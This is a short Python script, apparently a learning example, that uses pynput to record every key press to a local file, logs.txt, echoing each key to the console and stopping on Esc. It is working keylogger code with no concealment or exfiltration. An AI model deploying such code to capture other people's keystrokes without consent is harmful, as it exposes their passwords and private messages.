from pynput.keyboard import Key, Listener


# on_press(key)
# @paramters: key
# @return: void
# Gets called whenever a key pressed


def on_press(key):
    print(f'{key} pressed')
    write_file(key)

# write_file(key
# @parameters: key
# @return: void
# Writes the key pressed onto a file


def write_file(key):
    with open("logs.txt", "a") as f:
        ke = str(key).replace("'", "")
        if ke.find("space") > 0:
            f.write('\n')
        if ke.find("Key") == -1:
            f.write(ke)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
